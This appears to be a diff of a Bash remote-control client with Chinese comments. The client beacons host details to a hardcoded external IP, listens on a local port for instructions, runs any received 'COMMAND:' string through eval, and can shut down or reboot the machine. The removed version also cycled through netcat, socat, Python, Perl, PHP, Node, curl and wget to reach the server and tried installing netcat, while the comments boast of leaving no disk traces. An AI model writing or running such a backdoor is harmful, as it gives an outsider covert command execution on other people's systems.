@@ -1,560 +1,206 @@
 #!/bin/bash
 
-# 终极内存版客户端 - 完全在内存中运行，零磁盘操作
-# 支持所有可能的通信方式
+# 终极bash TCP客户端 - 只使用bash内置TCP功能
+# 完全不需要任何外部工具，零磁盘操作
 
 SERVER_IP="159.138.58.239"
 SERVER_PORT=25555
 CLIENT_PORT=5556
-HEARTBEAT_INTERVAL=30
+HEARTBEAT_INTERVAL=60
 
-# 完全内存化的变量存储
-CLIENT_VARS="/proc/self/fd/1"  # 使用标准输出作为变量存储
-
-# 初始化变量（完全内存操作）
-init_vars() {
-    # 序列号生成（无磁盘操作）
-    if [[ -r /proc/sys/kernel/random/boot_id ]]; then
-        SERIAL=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | md5sum 2>/dev/null | cut -c1-8 2>/dev/null)
-    elif [[ -r /proc/stat ]]; then
-        SERIAL=$(cat /proc/stat /proc/uptime 2>/dev/null | md5sum 2>/dev/null | cut -c1-8 2>/dev/null)
-    else
-        SERIAL=$(echo $(date +%s)$$ | md5sum 2>/dev/null | cut -c1-8 2>/dev/null)
-    fi
-    [[ -z "$SERIAL" ]] && SERIAL="mem$(date +%s)"
+# 内存初始化
+init_memory() {
+    # 从/proc获取系统信息
+    SERIAL=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | head -c 8 || echo "bash$$")
+    HOSTNAME=$(cat /proc/sys/kernel/hostname 2>/dev/null || echo "unknown")
+    SYSTEM_INFO="linux"
     
-    # 主机名（无磁盘操作）
-    if [[ -r /proc/sys/kernel/hostname ]]; then
-        HOSTNAME=$(cat /proc/sys/kernel/hostname 2>/dev/null)
-    else
-        HOSTNAME="unknown"
-    fi
-    
-    # 系统信息（无磁盘操作）
-    if [[ -r /proc/version ]]; then
-        SYSTEM_INFO=$(head -c 100 /proc/version 2>/dev/null | tr -cd '[:print:]')
-    else
-        SYSTEM_INFO="linux"
-    fi
-    
-    # 检测所有可能的通信工具
-    detect_tools
+    echo "=== Bash TCP客户端 ==="
+    echo "序列号: $SERIAL"
+    echo "服务器: $SERVER_IP:$SERVER_PORT"
+    echo "使用纯Bash TCP通信"
 }
 
-# 检测所有可能的通信工具
-detect_tools() {
-    # 检查netcat变种
-    for cmd in nc netcat ncat; do
-        if command -v $cmd >/dev/null 2>&1; then
-            NC_CMD=$cmd
-            break
-        fi
-    done
-    
-    # 检查其他工具
-    command -v bash >/dev/null 2>&1 && HAS_BASH=1 || HAS_BASH=0
-    command -v telnet >/dev/null 2>&1 && HAS_TELNET=1 || HAS_TELNET=0
-    command -v curl >/dev/null 2>&1 && HAS_CURL=1 || HAS_CURL=0
-    command -v wget >/dev/null 2>&1 && HAS_WGET=1 || HAS_WGET=0
-    command -v socat >/dev/null 2>&1 && HAS_SOCAT=1 || HAS_SOCAT=0
-    command -v python3 >/dev/null 2>&1 && HAS_PYTHON3=1 || HAS_PYTHON3=0
-    command -v python >/dev/null 2>&1 && HAS_PYTHON=1 || HAS_PYTHON=0
-    command -v perl >/dev/null 2>&1 && HAS_PERL=1 || HAS_PERL=0
-    command -v php >/dev/null 2>&1 && HAS_PHP=1 || HAS_PHP=0
-    command -v node >/dev/null 2>&1 && HAS_NODE=1 || HAS_NODE=0
-    command -v ncat >/dev/null 2>&1 && HAS_NCAT=1 || HAS_NCAT=0
-    
-    # 检查bash TCP支持
-    if [[ $HAS_BASH -eq 1 ]]; then
-        if timeout 1 bash -c "echo > /dev/tcp/8.8.8.8/53" 2>/dev/null; then
-            HAS_BASH_TCP=1
-        else
-            HAS_BASH_TCP=0
-        fi
-    else
-        HAS_BASH_TCP=0
-    fi
-}
-
-# 内存日志函数
+# 内存日志
 log() {
-    local timestamp=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo "0000-00-00 00:00:00")
+    local timestamp=$(date '+%H:%M:%S')
     echo "[$timestamp] $1" >&2
 }
 
-# 终极通信函数 - 尝试所有可能的方法
-send_data_ultimate() {
+# 纯Bash TCP发送函数
+bash_tcp_send() {
     local data="$1"
-    local port="$2"
-    local server="${3:-$SERVER_IP}"
+    local ip="$2"
+    local port="$3"
     
-    # 方法1: 使用netcat
-    if [[ -n "$NC_CMD" ]]; then
-        if echo "$data" | timeout 3 $NC_CMD "$server" "$port" 2>/dev/null; then
-            return 0
+    # 使用bash内置TCP功能
+    {
+        # 创建TCP连接
+        exec 3<>/dev/tcp/$ip/$port 2>/dev/null
+        if [[ $? -ne 0 ]]; then
+            return 1
         fi
-    fi
-    
-    # 方法2: 使用bash TCP
-    if [[ $HAS_BASH_TCP -eq 1 ]]; then
+        
+        # 发送数据
+        echo "$data" >&3 2>/dev/null
+        
+        # 读取响应（非阻塞）
         {
-            exec 3<>/dev/tcp/$server/$port 2>/dev/null && \
-            echo "$data" >&3 && \
-            exec 3>&- && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法3: 使用telnet
-    if [[ $HAS_TELNET -eq 1 ]]; then
-        {
-            echo "$data" | timeout 3 telnet "$server" "$port" 2>/dev/null | grep -q "Connected" && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法4: 使用socat
-    if [[ $HAS_SOCAT -eq 1 ]]; then
-        {
-            echo "$data" | timeout 3 socat - TCP:$server:$port 2>/dev/null && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法5: 使用ncat
-    if [[ $HAS_NCAT -eq 1 ]]; then
-        {
-            echo "$data" | timeout 3 ncat "$server" "$port" 2>/dev/null && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法6: 使用Python3
-    if [[ $HAS_PYTHON3 -eq 1 ]]; then
-        {
-            python3 -c "
-import socket, sys
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    s.connect(('$server', $port))
-    s.send(b'$data\n')
-    response = s.recv(1024)
-    print(response.decode().strip())
-    s.close()
-    sys.exit(0)
-except:
-    sys.exit(1)
-" 2>/dev/null && return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法7: 使用Python2
-    if [[ $HAS_PYTHON -eq 1 ]]; then
-        {
-            python -c "
-import socket, sys
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    s.connect(('$server', $port))
-    s.send('$data\n')
-    response = s.recv(1024)
-    print response.strip()
-    s.close()
-    sys.exit(0)
-except:
-    sys.exit(1)
-" 2>/dev/null && return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法8: 使用Perl
-    if [[ $HAS_PERL -eq 1 ]]; then
-        {
-            perl -e "
-use IO::Socket::INET;
-eval {
-    my \$socket = IO::Socket::INET->new(
-        PeerAddr => '$server',
-        PeerPort => $port,
-        Proto => 'tcp',
-        Timeout => 3
-    );
-    if (\$socket) {
-        print \$socket '$data\n';
-        my \$response = <\$socket>;
-        print \$response;
-        close(\$socket);
-        exit 0;
-    }
-    exit 1;
-};
-exit 1;
-" 2>/dev/null && return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法9: 使用PHP
-    if [[ $HAS_PHP -eq 1 ]]; then
-        {
-            php -r "
-<?php
-\$socket = @fsockopen('$server', $port, \$errno, \$errstr, 3);
-if (\$socket) {
-    fwrite(\$socket, '$data\n');
-    echo fread(\$socket, 1024);
-    fclose(\$socket);
-    exit(0);
-}
-exit(1);
-?>
-" 2>/dev/null && return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法10: 使用Node.js
-    if [[ $HAS_NODE -eq 1 ]]; then
-        {
-            node -e "
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(3000);
-
-client.connect($port, '$server', () => {
-    client.write('$data\n');
-});
-
-client.on('data', (data) => {
-    process.stdout.write(data.toString());
-    client.destroy();
-    process.exit(0);
-});
-
-client.on('timeout', () => {
-    client.destroy();
-    process.exit(1);
-});
-
-client.on('error', () => {
-    process.exit(1);
-});
-" 2>/dev/null && return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法11: 使用/dev/tcp直接写入（最后手段）
-    if [[ -w /dev/tcp ]]; then
-        {
-            echo "$data" > /dev/tcp/$server/$port 2>/dev/null && \
-            sleep 1 && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法12: 使用curl模拟TCP（HTTP包装）
-    if [[ $HAS_CURL -eq 1 ]]; then
-        {
-            echo "$data" | curl -s --connect-timeout 3 -X POST -d @- "http://$server:$port" 2>/dev/null && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    # 方法13: 使用wget模拟TCP
-    if [[ $HAS_WGET -eq 1 ]]; then
-        {
-            echo "$data" | wget -q -O - --connect-timeout=3 --tries=1 --post-data=- "http://$server:$port" 2>/dev/null && \
-            return 0
-        } 2>/dev/null
-    fi
-    
-    return 1
+            read -t 1 -r response <&3 2>/dev/null
+            echo "$response"
+        } &
+        
+        # 等待发送完成
+        sleep 0.5
+        
+        # 关闭连接
+        exec 3>&- 2>/dev/null
+        exec 3<&- 2>/dev/null
+        
+        return 0
+    } 2>/dev/null
 }
 
-# 终极监听函数
-listen_ultimate() {
+# Bash TCP监听函数
+bash_tcp_listen() {
     local port="$1"
+    local timeout="${2:-5}"
     
-    # 方法1: 使用netcat监听
-    if [[ -n "$NC_CMD" ]]; then
-        $NC_CMD -l -p "$port" -w 5 -c 'read -r data; echo "$data"' 2>/dev/null && return 0
-    fi
-    
-    # 方法2: 使用socat监听
-    if [[ $HAS_SOCAT -eq 1 ]]; then
-        socat -t 5 TCP-LISTEN:$port,reuseaddr STDOUT 2>/dev/null && return 0
-    fi
-    
-    # 方法3: 使用ncat监听
-    if [[ $HAS_NCAT -eq 1 ]]; then
-        ncat -l -p "$port" -w 5 --recv-only 2>/dev/null && return 0
-    fi
-    
-    # 方法4: 使用bash TCP监听（非阻塞）
-    if [[ $HAS_BASH_TCP -eq 1 ]]; then
-        for i in $(seq 1 5); do
-            {
-                read -r line < /dev/tcp/0.0.0.0/$port 2>/dev/null
-                if [[ -n "$line" ]]; then
-                    echo "$line"
-                    return 0
-                fi
-            } 2>/dev/null
-            sleep 1
-        done
-    fi
-    
-    # 方法5: 使用Python3监听
-    if [[ $HAS_PYTHON3 -eq 1 ]]; then
-        python3 -c "
-import socket, sys
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(5)
-s.bind(('0.0.0.0', $port))
-s.listen(1)
-try:
-    conn, addr = s.accept()
-    data = conn.recv(1024).decode().strip()
-    print(data)
-    conn.close()
-    sys.exit(0)
-except:
-    sys.exit(1)
-" 2>/dev/null && return 0
-    fi
-    
-    # 超时返回空
-    return 1
+    {
+        # 在子进程中监听
+        (
+            # 监听连接
+            exec 3<>/dev/tcp/0.0.0.0/$port 2>/dev/null
+            if [[ $? -ne 0 ]]; then
+                exit 1
+            fi
+            
+            # 读取数据
+            read -t $timeout -r data <&3 2>/dev/null
+            if [[ -n "$data" ]]; then
+                echo "$data"
+                exit 0
+            else
+                exit 1
+            fi
+        ) &
+        
+        local listener_pid=$!
+        
+        # 等待结果
+        wait $listener_pid 2>/dev/null
+        local result=$?
+        
+        # 清理
+        kill $listener_pid 2>/dev/null
+        
+        return $result
+    } 2>/dev/null
 }
 
-# 发送心跳包
+# 发送心跳
 send_heartbeat() {
     local heartbeat_data="HEARTBEAT|$SERIAL|$HOSTNAME|$SYSTEM_INFO"
     
-    if send_data_ultimate "$heartbeat_data" "$SERVER_PORT"; then
-        log "✓ 心跳成功 → $SERVER_IP:$SERVER_PORT"
+    if bash_tcp_send "$heartbeat_data" "$SERVER_IP" "$SERVER_PORT"; then
+        log "✓ 心跳成功"
         return 0
     else
-        log "✗ 心跳失败 → $SERVER_IP:$SERVER_PORT"
+        log "✗ 心跳失败"
         return 1
     fi
 }
 
-# 执行命令（完全内存操作）
+# 执行命令
 execute_command() {
     local command="$1"
-    log "执行命令: $command"
+    log "执行: $command"
     
-    # 在子shell中执行，避免阻塞主进程
+    # 在子shell中执行
     (
-        # 使用eval执行命令，重定向所有输出
         result=$(eval "$command" 2>&1)
-        log "命令结果: ${result:0:100}..."  # 只记录前100字符
+        log "结果: ${result:0:50}"
         echo "$result"
     ) &
 }
 
-# 执行脚本命令
-execute_script() {
-    local script_name="$1"
-    
-    case "$script_name" in
-        "shutdown"|"poweroff")
-            log "执行关机命令"
-            # 尝试多种关机方法
-            shutdown -h now 2>/dev/null || \
-            poweroff 2>/dev/null || \
-            halt -p 2>/dev/null || \
-            init 0 2>/dev/null
-            ;;
-        "reboot"|"restart")
-            log "执行重启命令"
-            # 尝试多种重启方法
-            reboot 2>/dev/null || \
-            shutdown -r now 2>/dev/null || \
-            init 6 2>/dev/null
-            ;;
-        "restart_services")
-            log "重启系统服务"
-            # 尝试重启网络服务
-            systemctl restart networking 2>/dev/null || \
-            systemctl restart network 2>/dev/null || \
-            service networking restart 2>/dev/null || \
-            /etc/init.d/networking restart 2>/dev/null
-            ;;
-        "system_info")
-            echo "=== 系统信息 ==="
-            echo "序列号: $SERIAL"
-            echo "主机名: $HOSTNAME"
-            echo "系统: $SYSTEM_INFO"
-            echo "内核: $(uname -r 2>/dev/null || echo 'unknown')"
-            echo "架构: $(uname -m 2>/dev/null || echo 'unknown')"
-            echo "上线时间: $(uptime 2>/dev/null || cat /proc/uptime 2>/dev/null || echo 'unknown')"
-            ;;
-        "test_connection")
-            echo "测试连接到服务器..."
-            if send_heartbeat; then
-                echo "连接测试成功"
-            else
-                echo "连接测试失败"
-            fi
-            ;;
-        *)
-            echo "未知命令: $script_name"
-            echo "可用命令: shutdown, reboot, restart_services, system_info, test_connection"
-            ;;
-    esac
-}
-
-# 处理命令
+# 处理接收的命令
 process_command() {
     local command_data="$1"
     
-    if echo "$command_data" | grep -q "^COMMAND:"; then
-        local cmd=$(echo "$command_data" | cut -d: -f2-)
+    if [[ "$command_data" == COMMAND:* ]]; then
+        local cmd="${command_data#COMMAND:}"
         execute_command "$cmd"
-    elif echo "$command_data" | grep -q "^SCRIPT:"; then
-        local script_name=$(echo "$command_data" | cut -d: -f2-)
-        execute_script "$script_name"
+    elif [[ "$command_data" == SCRIPT:* ]]; then
+        local script="${command_data#SCRIPT:}"
+        case "$script" in
+            shutdown) shutdown -h now ;;
+            reboot) reboot ;;
+            *) log "未知脚本: $script" ;;
+        esac
     else
-        log "未知命令格式: $command_data"
+        log "未知命令: $command_data"
     fi
 }
 
-# 显示工具状态
-show_tool_status() {
-    log "工具检测:"
-    [[ -n "$NC_CMD" ]] && log "  ✓ netcat: $NC_CMD" || log "  ✗ netcat: 不可用"
-    [[ $HAS_BASH_TCP -eq 1 ]] && log "  ✓ bash TCP: 可用" || log "  ✗ bash TCP: 不可用"
-    [[ $HAS_TELNET -eq 1 ]] && log "  ✓ telnet: 可用" || log "  ✗ telnet: 不可用"
-    [[ $HAS_SOCAT -eq 1 ]] && log "  ✓ socat: 可用" || log "  ✗ socat: 不可用"
-    [[ $HAS_PYTHON3 -eq 1 ]] && log "  ✓ python3: 可用" || log "  ✗ python3: 不可用"
-    [[ $HAS_PYTHON -eq 1 ]] && log "  ✓ python: 可用" || log "  ✗ python: 不可用"
-    [[ $HAS_PERL -eq 1 ]] && log "  ✓ perl: 可用" || log "  ✗ perl: 不可用"
-}
-
-# 尝试安装基本工具（如果可能）
-try_install_tools() {
-    log "尝试安装基本工具..."
-    
-    # 检查可用的包管理器
-    if command -v apt-get >/dev/null 2>&1; then
-        # 使用Debian/Ubuntu包管理器
-        apt-get update >/dev/null 2>&1 && \
-        apt-get install -y netcat-traditional >/dev/null 2>&1 && \
-        log "✓ 使用apt安装netcat成功" && \
-        return 0
-    elif command -v yum >/dev/null 2>&1; then
-        # 使用CentOS/RHEL包管理器
-        yum install -y nc >/dev/null 2>&1 && \
-        log "✓ 使用yum安装netcat成功" && \
-        return 0
-    elif command -v apk >/dev/null 2>&1; then
-        # 使用Alpine包管理器
-        apk add netcat-openbsd >/dev/null 2>&1 && \
-        log "✓ 使用apk安装netcat成功" && \
-        return 0
-    fi
-    
-    log "✗ 无法安装工具，使用现有工具"
-    return 1
-}
-
-# 守护进程主循环
+# 主守护进程
 start_daemon() {
-    log "=== 启动终极内存客户端 ==="
-    log "序列号: $SERIAL"
-    log "主机名: $HOSTNAME"
-    log "系统: $SYSTEM_INFO"
-    log "服务器: $SERVER_IP:$SERVER_PORT"
-    
-    show_tool_status
+    log "启动Bash TCP守护进程"
     
     local heartbeat_count=0
     local success_count=0
-    local last_success=0
     
-    # 主循环
     while true; do
-        # 发送心跳
         heartbeat_count=$((heartbeat_count + 1))
         
+        # 发送心跳
         if send_heartbeat; then
             success_count=$((success_count + 1))
-            last_success=$heartbeat_count
-        fi
-        
-        # 计算成功率
-        local success_rate=0
-        if [[ $heartbeat_count -gt 0 ]]; then
-            success_rate=$((success_count * 100 / heartbeat_count))
         fi
         
         # 监听命令（非阻塞）
-        local command_data=$(listen_ultimate "$CLIENT_PORT")
+        local command_data=$(bash_tcp_listen "$CLIENT_PORT" 2)
         if [[ -n "$command_data" ]]; then
             log "收到命令: $command_data"
             process_command "$command_data" &
         fi
         
-        # 每10次心跳显示状态
-        if [[ $((heartbeat_count % 10)) -eq 0 ]]; then
-            log "运行状态: 心跳$heartbeat_count, 成功$success_count, 成功率${success_rate}%"
-            
-            # 如果连续失败太多，重新检测工具
-            if [[ $((heartbeat_count - last_success)) -gt 5 ]]; then
-                log "检测到连续失败，重新初始化工具..."
-                detect_tools
-                show_tool_status
-                last_success=$heartbeat_count
-            fi
+        # 显示状态
+        if [[ $((heartbeat_count % 5)) -eq 0 ]]; then
+            local rate=$((success_count * 100 / heartbeat_count))
+            log "状态: ${heartbeat_count}次心跳, ${success_count}次成功 (${rate}%)"
         fi
         
         sleep "$HEARTBEAT_INTERVAL"
     done
 }
 
-# 主函数
-main() {
-    log "初始化终极内存客户端..."
+# 测试连接
+test_connection() {
+    log "测试服务器连接..."
     
-    # 初始化变量
-    init_vars
-    
-    # 显示初始状态
-    log "客户端信息:"
-    log "  序列号: $SERIAL"
-    log "  主机名: $HOSTNAME" 
-    log "  系统: $SYSTEM_INFO"
-    log "  服务器: $SERVER_IP:$SERVER_PORT"
-    
-    # 尝试安装工具（如果不成功也没关系）
-    if [[ -z "$NC_CMD" ]]; then
-        try_install_tools
-        # 重新检测工具
-        detect_tools
-    fi
-    
-    # 显示最终工具状态
-    show_tool_status
-    
-    # 测试初始连接
-    log "测试初始连接..."
-    if send_heartbeat; then
-        log "✓ 初始连接测试成功"
+    if bash_tcp_send "TEST" "$SERVER_IP" "$SERVER_PORT"; then
+        log "✓ 服务器连接测试成功"
+        return 0
     else
-        log "✗ 初始连接测试失败，但将继续尝试"
+        log "✗ 服务器连接测试失败"
+        return 1
     fi
-    
-    # 启动守护进程
-    log "启动主守护进程..."
-    start_daemon
 }
 
-# 信号处理
-trap 'log "客户端停止"; exit 0' INT TERM
+# 主函数
+main() {
+    init_memory
+    
+    # 测试连接
+    if test_connection; then
+        log "开始主循环..."
+        start_daemon
+    else
+        log "无法连接服务器，退出"
+        exit 1
+    fi
+}
 
-# 脚本入口
-if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    main "$@"
-fi
+# 启动
+main
